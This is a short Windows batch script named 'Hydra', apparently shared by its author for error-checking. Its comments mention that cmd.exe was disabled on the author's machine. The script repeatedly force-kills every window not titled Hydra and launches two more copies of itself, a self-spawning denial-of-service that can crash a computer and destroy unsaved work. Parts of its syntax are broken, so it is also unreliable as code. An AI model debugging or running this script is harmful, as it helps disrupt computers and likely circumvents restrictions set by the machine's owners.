@ECHO OFF
::Can't test either, they found a way to disable cmd.exe, SO BATCH IS DEAD!
::Wrote this on my phone so I cannot test, so can you check for any errors? 
TITLE Hydra 
set n=0
:start
set /a n+=1
Findstr /m "%n%" data.txt
if %errorlevel%==0 (
goto :start
) ELSE (
goto :loop
)
:loop 
FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
SET windowcount=%%F
)
TASKKILL /F /FI "WINDOWTITLE ne Hydra"
IF "%windowcount%"<"%n%" (
START Hydra.bat
START Hydra.bat
set /a n+=1
Echo %n% > data.txt
)
GOTO :loop
